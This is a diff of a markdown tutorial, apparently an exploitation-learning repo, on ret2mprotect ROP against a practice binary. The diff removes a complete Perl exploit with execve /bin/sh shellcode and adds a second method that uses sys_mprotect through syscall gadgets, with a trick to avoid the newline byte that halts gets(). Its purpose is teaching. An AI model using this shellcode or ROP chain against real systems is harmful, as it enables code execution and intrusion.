@@ -189,28 +189,76 @@ We need our return address now. I will execute `x/50gx $rsp-340` for it or whate
 
 ![image](https://user-images.githubusercontent.com/87600765/175782131-0362a2a1-1019-4743-adcd-26facc1a6f6b.png)
 
-So this is our final exploit.
-
-```pl
-#!/usr/bin/perl
-
-$| = 1;
-#$offset = "A"*280
-$pop_rdi = pack("Q", 0x00000000004018ca);
-$pop_rsi = pack("Q", 0x000000000040f44e);
-$pop_rdx = pack("Q", 0x00000000004017cf);
-$stack_address = pack("Q", 0x00007ffffffde000);
-$stack_size = pack("Q", 0x21000);
-$rwx = pack("Q", 0x7);
-$mprotect = pack("Q", 0x451bf0);
-$nops = "\x90" x 100;
-$shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
-$offset  = "A" x 150;
-$return_address = pack("Q", 0x7fffffffe314);
-print   $nops . $shellcode . $offset . $pop_rdi . $stack_address . $pop_rsi . $stack_size . $pop_rdx . $rwx . $mprotect . $return_address;
-```
+Our final exploit is [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit.pl) and [here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit.py) you can have a python exploit version with pwntools.
 
 If we run the program:
 
 ![image](https://user-images.githubusercontent.com/87600765/175782230-26f0e762-6de6-412d-b461-d9d53ef55db2.png)
+
+## 2nd method to do a ret2mprotect
+
+Actually we call mprotect using 3 arguments and then thx to the ret the address of mprotect is pop on rip so the function is called but there is actually another way when we can simply use the syscall table and call mprotect. We will need more gadgets but I guess it's fine to know different ways to do one technique. Also you learn how to use gadgets.
+
+I am using this syscall table which have a lot of tables for different architectures. https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
+
+![image](https://user-images.githubusercontent.com/87600765/175783213-6f185784-6658-4998-bb81-b3ad7397ce40.png)
+
+So for use the sys_mprotect we need to have `0xa` in `rax`, the address of the mapped region in `rdi`, the size in `rsi` and `0x7` in rdx. So this time we don't need the address of mprotect since we are doing a sys_mprotect. 
+
+### Gadgets
+
+We already have the address of pop rdi, rsi and rdx. Now we need a gadget with a syscall and pop rax.
+
+![image](https://user-images.githubusercontent.com/87600765/175783780-d24d376c-6982-4ebb-962c-a8e4f4cc378a.png)
+
+```md
+pop_rdi = 0x00000000004018ca
+pop_rdx = 0x00000000004017cf
+pop_rsi = 0x000000000040f44e
+pop_rax = 0x0000000000451857
+syscall = 0x000000000041e0d4
+```
+
+We have now all the gadgets that we want. For now I will use the same exploit but just modify it a little bit. So this is the [final exploit](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit2.pl).
+
+Then let's see if it makes the stack executable. Let's run the program in gdb with the payload
+
+![image](https://user-images.githubusercontent.com/87600765/175784739-e668c32b-cc6c-4120-bf38-1c625cb561c3.png)
+
+Wait what ! It doesn't work. let's debug what is happening with gdb. We break main and run the program and then put a breakpoint at ret like last time. 
+
+![image](https://user-images.githubusercontent.com/87600765/175784221-b99ab1a6-23f0-41c9-a3a5-78fada164d95.png)
+
+OK we see the pop rax. Let's continue. After the `pop rax` our payload is done 
+
+![image](https://user-images.githubusercontent.com/87600765/175784263-f184f5ab-2e1b-463d-9f62-43b81aea39a6.png)
+
+And then the program has a segfault but our ropchain wasn't finish. 
+
+![image](https://user-images.githubusercontent.com/87600765/175784288-5cbf5749-7f3a-49d2-aea0-91c948e8e0c6.png)
+
+So what happened ? If you look at the ASCII table and the value A (which is the value that we need to put in `rax`) is the value for the new line feed.
+
+![image](https://user-images.githubusercontent.com/87600765/175784357-ae01adc2-91fe-41ec-bcea-2b7b9c37d329.png)
+
+And this is because of this new line feed that our ropchain stop because when the gets() function receive a new line feed it stops. If for example you run the binary and wehn it ask for the name and you press enter (so for a new line) gets stops. We need to bypass this. Actually we can send a wrong value to rax and then add a value to have 0xa in rax. For example we can put 0x9 in rax and then add 1 to rax to have 0xa. Let's search for this kind of thing with ropper.
+
+![image](https://user-images.githubusercontent.com/87600765/175784520-e35245a9-e6a0-40a3-bb6d-627ae3edcce4.png)
+
+Actually you can use this 3 gadgets but you will need to substract the initial value with the value added by the gadget. In this case we can simply use this `add rax, 1 ; ret`. So `0xa` - 1 = `0x9`
+
+So instead put the value of `0xa` in `rax` we will put `0x9` and then add 1 to `rax` so let's modify our exploit. [Here](https://github.com/B1rby/Art-of-Exploitation/blob/main/rop/ret2mprotect/exploit2-fixed.pl) is the final exploit. So let's examine what finally happened. 
+
+As you can see we are about to execute our add rax 1 and `0x9` was popped to rax. 
+
+![image](https://user-images.githubusercontent.com/87600765/175785943-c0ebf7b9-0be4-4b85-8417-79437e387a42.png)
+![image](https://user-images.githubusercontent.com/87600765/175786039-e2a32f2a-39f7-4291-84c6-1a68026eedc9.png)
+
+And after the add rax 1 there is `0xa` in rax as we want and our rop chain is continuing as expected and wanted.
+
+![image](https://user-images.githubusercontent.com/87600765/175786081-3f5237c7-2f25-4572-bbe9-57139dd0f5f4.png)
+
+After the syscall, the stack is executable and our new exploit works.
+
+![image](https://user-images.githubusercontent.com/87600765/175786120-4fd1e0e8-9f83-4ed9-8583-2bf6e1ed8b6b.png)
 
